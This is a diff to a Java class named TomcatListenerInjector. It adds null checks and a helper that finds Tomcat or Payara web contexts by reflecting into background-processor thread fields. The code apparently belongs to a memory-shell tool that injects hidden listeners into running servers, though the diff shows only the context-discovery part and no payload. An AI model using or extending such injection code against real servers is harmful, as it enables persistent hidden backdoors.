@@ -63,10 +63,19 @@ public class TomcatListenerInjector {
                 if (target == null) {
                     continue;
                 }
-                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(target, "this$0"), "children");
+                Object container = getContainerFromProcessor(target);
+                if (container == null) {
+                    continue;
+                }
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(container, "children");
+                if (childrenMap == null) {
+                    continue;
+                }
                 for (Object value : childrenMap.values()) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    contexts.addAll(children.values());
+                    if (children != null) {
+                        contexts.addAll(children.values());
+                    }
                 }
             } else if (threadName.contains("Poller") && !threadName.contains("ajp")) {
                 try {
@@ -108,6 +117,23 @@ public class TomcatListenerInjector {
             }
         }
         return target;
+    }
+
+    /**
+     * Older Catalina: ContainerBackgroundProcessor.this$0
+     * Payara 6.2024+/7 style: ContainerBackgroundProcessorAtomic.base (WeakReference)
+     */
+    private Object getContainerFromProcessor(Object target) throws Exception {
+        Object container = getFieldValue(target, "this$0");
+        if (container != null) {
+            return container;
+        }
+        Object atomic = getFieldValue(target, "containerBackgroundProcessorAtomic");
+        Object base = atomic != null ? getFieldValue(atomic, "base") : getFieldValue(target, "base");
+        if (base instanceof java.lang.ref.Reference) {
+            return ((java.lang.ref.Reference<?>) base).get();
+        }
+        return base;
     }
 
     @SuppressWarnings("all")
